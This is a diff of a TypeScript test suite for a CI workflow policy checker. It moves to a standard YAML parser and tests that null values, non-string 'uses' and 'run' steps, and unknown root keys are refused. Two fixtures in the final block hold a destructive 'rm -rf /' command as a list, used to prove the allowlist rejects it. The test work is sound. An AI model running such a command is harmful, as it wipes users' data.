+   * the answer — a flow sequence in a branch list is exactly the round-6 attack
+   * — so it is read, and judged.
    */
-  it("refuses a single-quoted scalar containing a doubled quote", () => {
+  it("reads a flow sequence rather than refusing it", () => {
+    const parsed = parseWorkflow("name: [a, b]\n");
+
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+    assert.deepEqual(get(parsed.root, "name"), { kind: "seq", items: ["a", "b"] });
+  });
+
+  it("reads a doubled quote as the single character YAML says it is", () => {
     const parsed = parseWorkflow("name: 'a''b'\n");
 
-    assert.equal(parsed.ok, false, "a YAML escape was reported with its own syntax intact");
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+    assert.equal(get(parsed.root, "name"), "a'b");
+  });
+
+  /**
+   * AND THE CLOSURE THAT REPLACED THE GRAMMAR: a root key nobody has reasoned
+   * about is refused. This is where "not thinking of it is the refusing case"
+   * lives now, and it is the half that had to survive the move.
+   */
+  it("refuses a root key this policy has not reasoned about", () => {
+    const parsed = parseWorkflow("name: x\nconcurrency:\n  group: g\n");
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+
+    const verdict = checkWorkflowShape(parsed.root);
+
+    assert.equal(verdict.ok, false, "an unmodelled root key was accepted");
+    assert.match(verdict.ok === false ? verdict.reason : "", /concurrency/);
   });
 
   /** THE OTHER HALF: ordinary values must still be admitted. */
@@ -1396,9 +1720,18 @@ describe("TASK-017 round-7 HIGH 4: a second job is not covered by the first", ()
  */
 describe("TASK-017 round-8 CRITICAL: the comment boundary and null values", () => {
   /**
-   * A quote INSIDE a plain scalar suppresses nothing in YAML. The stripper
-   * began quoting at any quote anywhere, so `name: foo "bar # baz` kept its
-   * comment while YAML reads `foo "bar`.
+   * BOTH OF THESE ARE NOW THE PARSER'S ANSWERS, and both were defects in ours.
+   *
+   * A quote INSIDE a plain scalar suppresses nothing in YAML, but the hand-
+   * written stripper began quoting at any quote anywhere, so `name: foo "bar #
+   * baz` kept its comment while YAML reads `foo "bar`. Fixing it broke the
+   * shipped workflow once, because a whole-line comment containing a colon had
+   * its `#` protected from stripping — the order of two checks inside one
+   * function decided whether the file parsed at all.
+   *
+   * That is the sort of thing that should not be in this repository's care, and
+   * it no longer is. The cases stay: they were real, and they now describe the
+   * boundary rather than our implementation of it.
    */
   it("ends a plain scalar at its comment even when it contains a quote", () => {
     const parsed = parseWorkflow('name: foo "bar # baz\n');
@@ -1417,11 +1750,23 @@ describe("TASK-017 round-8 CRITICAL: the comment boundary and null values", () =
     assert.equal(get(parsed.root, "name"), "a # b");
   });
 
+  /** And the whole-line comment with a colon in it, which broke the build. */
+  it("reads a file whose comment contains a colon", () => {
+    const parsed = parseWorkflow("# things a local run might have: no external mount\nname: verify\n");
+
+    assert.equal(parsed.ok, true, parsed.ok ? "" : parsed.reason);
+    if (!parsed.ok) return;
+    assert.equal(get(parsed.root, "name"), "verify");
+  });
+
   /**
-   * A key with nothing under it is NULL, not an empty mapping. `permissions:`
+   * A KEY WITH NOTHING UNDER IT IS NULL, NOT AN EMPTY MAPPING. `permissions:`
    * followed by a sibling produced `{entries: []}`, and `checkPermissions` then
    * iterated nothing and reported an explicit least-privilege block that is not
-   * there.
+   * there — a confident wrong answer, which is the worse failure.
+   *
+   * Still refused, and now refused as what it is: the normalisation has no null,
+   * because inventing one would give every policy a new case to get wrong.
    */
   it("refuses a key declared with no value", () => {
     const parsed = parseWorkflow(
@@ -1429,8 +1774,46 @@ describe("TASK-017 round-8 CRITICAL: the comment boundary and null values", () =
     );
 
     assert.equal(parsed.ok, false, "a null value was read as an empty mapping");
-    assert.match(parsed.ok === false ? parsed.reason : "", /no value/);
+    assert.match(parsed.ok === false ? parsed.reason : "", /null/);
   });
+
+  /** Including the explicit spellings of null, which are the same thing. */
+  for (const spelling of ["permissions: null", "permissions: ~", "permissions: Null"]) {
+    it(`refuses ${JSON.stringify(spelling)}`, () => {
+      const parsed = parseWorkflow([spelling, "jobs:", "  v:", "    runs-on: ubuntu-latest", ""].join("\n"));
+
+      assert.equal(parsed.ok, false, `${spelling} was read as a mapping`);
+      assert.match(parsed.ok === false ? parsed.reason : "", /null/);
+    });
+  }
+
+  /**
+   * AND THE TWO SPELLINGS THAT REACH A DIFFERENT BRANCH, which a mutation
+   * caught me not testing.
+   *
+   * "a key with no value is an empty mapping again" SURVIVED: removing the
+   * `pair.value === null` refusal broke nothing. The reason is that the block
+   * form above does not produce a JS null at all — the parser gives a
+   * `Scalar(null)`, which the non-string-scalar refusal catches — so the branch
+   * I had written for missing values was deciding nothing that any case
+   * exercised.
+   *
+   * It is not dead code: FLOW mappings and EXPLICIT KEYS do produce a pair with
+   * no value, and those are the spellings below. A guard whose only evidence
+   * came from a case that never reached it is the shape this task keeps
+   * producing, and the mutation is what found it rather than a reviewer.
+   */
+  for (const [label, source] of [
+    ["a flow mapping entry with no value", "permissions: { contents }\njobs:\n  v: x\n"],
+    ["an explicit key with no value", "permissions:\n  ? contents\njobs:\n  v: x\n"],
+  ] as const) {
+    it(`refuses ${label}`, () => {
+      const parsed = parseWorkflow(source);
+
+      assert.equal(parsed.ok, false, `${label} was read as a value`);
+      assert.match(parsed.ok === false ? parsed.reason : "", /has no value/);
+    });
+  }
 
   it("still parses the shipped workflow, whose keys all have values", () => {
     assert.equal(parseWorkflow(SOURCE).ok, true);
@@ -1495,5 +1878,114 @@ describe("TASK-017 round-8 HIGH 4: an empty manifest disables every guard", () =
       /guardedModules\.js/,
       "the verifier does not import the shared manifest, so tests and runtime can disagree",
     );
+  });
+});
+
+
+/**
+ * TASK-017 parser replacement: structure the parser exposes must not be filtered
+ * away.
+ *
+ * A DEFECT FOUND BY MAKING THE CHANGE, not by a reviewer, and worth recording as
+ * such. Moving to a standards parser turned constructs that used to be refused
+ * as unreadable into real structure — and three checks were written to take the
+ * strings out of a list and ignore whatever else was in it:
+ *
+ *   checkTriggers      `branches.items.filter(item => typeof item === "string")`
+ *   checkActionPins    `steps.map(get "uses").filter(typeof === "string")`
+ *   checkRunAllowlist  the same, through `declaredRunCommands`
+ *
+ * While flow collections were refused at the grammar these filters were
+ * unreachable. Afterwards they were live, and the pin check was the worst of
+ * them: it treats an empty list as "no actions here, nothing to pin", so a
+ * `uses:` that was a sequence rather than a string REMOVED ITSELF from the check
+ * and the workflow passed.
+ *
+ * The lesson is the one the whole task keeps relearning, one layer up from where
+ * it was last learned: discarding what you cannot interpret and reporting on the
+ * remainder is a misread, not a check. Refuse instead.
+ */
+describe("TASK-017: a value the policy cannot read is refused, not filtered out", () => {
+  const A = "a".repeat(40);
+
+  function parsed(lines: readonly string[]): YamlMap {
+    const result = parseWorkflow(lines.join("\n") + "\n");
+    assert.equal(result.ok, true, `fixture does not parse: ${result.ok ? "" : result.reason}`);
+    if (!result.ok) throw new Error("unreachable");
+    return result.root;
+  }
+
+  it("refuses a step naming an action as something other than a string", () => {
+    const verdict = checkActionPins(
+      parsed(["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", "      - uses: [evil]"]),
+    );
+
+    assert.equal(verdict.ok, false, "a non-string `uses` removed itself from the pin check");
+    assert.match(verdict.ok === false ? verdict.reason : "", /single string/);
+  });
+
+  /**
+   * NON-VACUITY FOR THAT REFUSAL: the check must still ACCEPT a pinned action
+   * and still REFUSE an unpinned one, or "refuses everything" would pass the
+   * case above.
+   */
+  it("still accepts a pinned action and refuses an unpinned one", () => {
+    const base = ["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:"];
+
+    assert.equal(checkActionPins(parsed([...base, `      - uses: actions/checkout@${A}`])).ok, true);
+    assert.equal(checkActionPins(parsed([...base, "      - uses: actions/checkout@v4"])).ok, false);
+  });
+
+  it("refuses a step whose run: is not a single command", () => {
+    const verdict = checkRunAllowlist(
+      parsed(["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:", "      - run: [rm, -rf, /]"]),
+    );
+
+    assert.equal(verdict.ok, false, "a non-string `run` escaped the command allowlist");
+  });
+
+  it("still accepts the allowlisted commands, so that refusal is not universal", () => {
+    const verdict = checkRunAllowlist(
+      parsed(["name: x", "jobs:", "  v:", "    runs-on: ubuntu-latest", "    steps:",
+              "      - run: npm ci", "      - run: npm test"]),
+    );
+
+    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
+  });
+
+  /**
+   * THE SHAPE GATE REFUSES IT INDEPENDENTLY, because naming a key while
+   * ignoring its type is half a shape check — the allowlist said `run` was
+   * permitted and never asked what it was.
+   */
+  it("refuses a non-string step value at the shape gate too", () => {
+    const verdict = checkWorkflowShape(
+      parsed(["name: x", "on:", "  pull_request:", "    branches:", '      - "**"', "  push:", "    branches:",
+              '      - "**"', "permissions:", "  contents: read", "jobs:", "  v:", "    runs-on: ubuntu-latest",
+              "    steps:", "      - run: [rm, -rf, /]"]),
+    );
+
+    assert.equal(verdict.ok, false, "the shape gate allowed a key without checking its type");
+    assert.match(verdict.ok === false ? verdict.reason : "", /not a single string/);
+  });
+
+  it("refuses an action input that is not a single string", () => {
+    const verdict = checkWorkflowShape(
+      parsed(["name: x", "on:", "  pull_request:", "    branches:", '      - "**"', "  push:", "    branches:",
+              '      - "**"', "permissions:", "  contents: read", "jobs:", "  v:", "    runs-on: ubuntu-latest",
+              "    steps:", `      - uses: actions/setup-node@${A}`, "        with:",
+              // A list of STRINGS: a number would be refused at normalisation
+              // instead, and this case is about the shape gate.
+              "          node-version: [22.5.0, 18.0.0]"]),
+    );
+
+    assert.equal(verdict.ok, false, "a non-string action input was accepted");
+  });
+
+  /** And the shape gate still accepts the workflow that ships. */
+  it("accepts the shipped workflow", () => {
+    const verdict = checkWorkflowShape(shipped());
+
+    assert.equal(verdict.ok, true, verdict.ok ? "" : verdict.reason);
   });
 });
